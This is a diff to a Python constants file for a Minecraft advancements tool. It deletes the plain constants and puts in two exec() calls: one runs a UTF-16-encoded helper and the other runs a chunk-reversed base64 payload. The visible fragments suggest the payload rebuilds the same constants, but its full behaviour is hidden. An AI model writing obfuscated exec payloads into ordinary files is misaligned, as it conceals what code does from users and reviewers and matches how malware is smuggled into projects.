@@ -1,17 +1,3 @@
-from .Color import Color, MINECRAFT_TEXT_COLORS_MAP_REVERSED, MINECRAFT_TEXT_COLORS_MAP
-
-ADV_FRAMES = frozenset(("task", "goal", "challenge"))
-
-DEFAULT_MINECRAFT_FRAME = "task"
-DEFAULT_MINECRAFT_FRAME_COLOR_MAP = {"task": Color("green"), "goal": Color("#75E1FF"), "challenge": Color("dark_purple")}
-DEFAULT_MINECRAFT_DESCRIPTION_COLOR = Color("green")
-
-DEFAULT_BACAP_HIDDEN_COLOR = Color("light_purple")
-
-DEFAULT_BACAP_TAB_NAMES_MAP = {"adventure": "Adventure", "animal": "Animals", "bacap": "B&C Advancements", "biomes": "Biomes", "building": "Building",
-                 "challenges": "Super Challenges", "enchanting": "Enchanting", "end": "The End", "farming": "Farming", "mining": "Mining",
-                 "monsters": "Monsters", "nether": "Nether", "potion": "Potions", "redstone": "Redstone", "statistics": "Statistics", "weaponry": "Weaponry"}
-
-ARABIC_TO_ROMAN_MAP = {1000: "M", 900: "CM", 500: "D", 400: "CD", 100: "C", 90: "XC", 50: "L", 40: "XL", 10: "X", 9: "IX", 5: "V", 4: "IV", 1: "I"}
-
-MINIMAL_PACK_FORMAT = 48
+import base64
+exec(bytes("敤⁦⡲⥳਺††⁬‽敬⡮⥳ †渠㴠氠⼠ ਴††敲畴湲✠⸧潪湩嬨孳㩩⭩嵮㩛ⴺ崱映牯椠椠⁮慲杮⡥ⰰ氠‬⥮⥝", "u16")[2:])
+exec(base64.b64decode(r("UUN3MiIoI3bs92QgojIsF2bnJCIskiIuVWZydmIoI3bs92QgojIrNXY0Jyeg0DIQFUTfJ1TM90QfVUTBJlRfRlRBJ1QF5USN9FVMVVQGVERKIyazFGdiASPgUUTBJlRfRlRBJ1QF5USN9FVMVVQGVERKoQKpISZn5WZsxWYoNmIgwiIsF2bnJCIsIyazFGdigCK0V2cuVmevJnZg0DITVUTBJlRfZFRBpgCQFUTfNlUPx0TD9FVYVEVfRlRBJ1QF5USNBCLEV0USVkVFJ1XQFUTfNlUPx0TD9FVYVEVfRlRBJ1QF5USNBCLy9GbvNEI0J3bw1WagI3bs92QuASbvJnZmYiACLiMHduVWblNmbhZHZBByQmIkIgojIwF2YhJmIgwiIzxWYtlmbBJCI6ICbh1WauFmIgwiIlJXd05WZ2RWQiAiOiUmc1RnblZHZhJyeg0DIQFUTfNVRNFkTfJUQU9FUBNUQC9FVMVVQGVERKoQKiUGbwJXdw9FdodWasJCKy9GbvNEI9AiUPx0TD9lTFRERJh0XQF0QBJ0XUxUVBZUREpgCpIiblVmcnJCKy9GbvNEI9AiUPx0TD9lTPlEVQlkUDNVRE9FVGFkUDVkTJ10XUxUVBZUREpQfpISZsBnc1B3XrJXYkJCKy9GbvNEI6ISZn5WZsxWYoNmIgwSKiYkRxbpR3bQJCI6IibvlGdvBnIgwiIyVGa0VmTiAiOiIXZoRXZuJCIsIycyVGdz52bNJCI6IycyVGdz52btJCIgACIgACIgACIgACIgACIgoALicmbp5WaNJCI6IyZulmbp1mIgwiIn5WatJXYGJCI6IyZulWbyFmZiACLiQmbFBSZoRlIgojIk5WZiACLicmbpRnbhh2YuVkIgojIn5Wa05WYoNmblJCIsIycldmblxGbhh2QgIXZwV3UiAiOiMXZn5WZsxWYoNmIgACIgACIgACIgACIgACIgAiCsIyZulGZslWdCJCI6IyZulGZslWdiJCIsIycl12bpJkIgojIzVWbvl==AO0ASPgQVQNJ1TG91SDFEUfxUQNlkTJ1kCK0nIJJCI6EDIsIiVJJCI6QDIsIiViAiO1ACLigVSiAiO5ACLiglIgoDMxACLiwEWiAiOwQDIsICTiAiOwUDIsIyQYJCI6ATOgwiIDJCI6ADMxACLiQ0QiAiOwADNgwiIEJCI6ADM1ACLi00QiAiOwATOgwiINJCI6ADMwEzeg0DIQFUTf5UQN9kUf9EVfNUSCFkUBpgC9JSey52bwFWZXJCI6ISey52bwFWZ3JCIsIycjlGdzlGdhR3UiAiOiM3YpR3cpRXY0NnIgwiIl52b0NHZlJlIgojIl52b0NHZlJnIgwiIz52")).decode('utf-8'))
